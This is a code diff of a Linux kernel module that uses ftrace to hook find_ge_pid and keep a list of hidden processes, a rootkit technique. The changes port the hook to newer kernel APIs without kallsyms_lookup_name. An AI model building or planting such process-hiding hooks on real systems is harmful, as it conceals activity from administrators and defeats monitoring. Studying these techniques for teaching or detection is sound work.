@@ -1,5 +1,6 @@
 #include <linux/cdev.h>
 #include <linux/ftrace.h>
+#include <linux/idr.h>
 #include <linux/kallsyms.h>
 #include <linux/list.h>
 #include <linux/module.h>
@@ -13,44 +14,28 @@ enum RETURN_CODE { SUCCESS };
 
 struct ftrace_hook {
 	const char *name;
-	void *func, *orig;
+	void *func;
 	unsigned long address;
 	struct ftrace_ops ops;
 };
 
-static int hook_resolve_addr(struct ftrace_hook *hook)
-{
-	hook->address = kallsyms_lookup_name(hook->name);
-	if (!hook->address) {
-		printk("unresolved symbol: %s\n", hook->name);
-		return -ENOENT;
-	}
-	*((unsigned long *) hook->orig) = hook->address;
-	return 0;
-}
-
 static void notrace hook_ftrace_thunk(unsigned long ip,
 				      unsigned long parent_ip,
 				      struct ftrace_ops *ops,
-				      struct pt_regs *regs)
+				      struct ftrace_regs *fregs)
 {
 	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 	if (!within_module(parent_ip, THIS_MODULE))
-		regs->ip = (unsigned long) hook->func;
+		arch_ftrace_get_regs(fregs)->ip = (unsigned long) hook->func;
 }
 
 static int hook_install(struct ftrace_hook *hook)
 {
-	int err = hook_resolve_addr(hook);
-	if (err)
-		return err;
-
 	hook->ops.func = hook_ftrace_thunk;
-	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS |
-			  FTRACE_OPS_FL_RECURSION_SAFE |
-			  FTRACE_OPS_FL_IPMODIFY;
+	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
 
-	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+	int err = ftrace_set_filter(&hook->ops, hook->name,
+				    strlen(hook->name), 0);
 	if (err) {
 		printk("ftrace_set_filter_ip() failed: %d\n", err);
 		return err;
@@ -84,8 +69,9 @@ typedef struct {
 
 LIST_HEAD(hidden_proc);
 
-typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
-static find_ge_pid_func real_find_ge_pid;
+static struct pid *real_find_ge_pid(int nr, struct pid_namespace *ns) {
+	return idr_get_next(&ns->idr, &nr);
+}
 
 static struct ftrace_hook hook;
 
@@ -109,11 +95,8 @@ static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
 
 static void init_hook(void)
 {
-	real_find_ge_pid =
-		(find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
 	hook.name = "find_ge_pid";
 	hook.func = hook_find_ge_pid;
-	hook.orig = &real_find_ge_pid;
 	hook_install(&hook);
 }
 
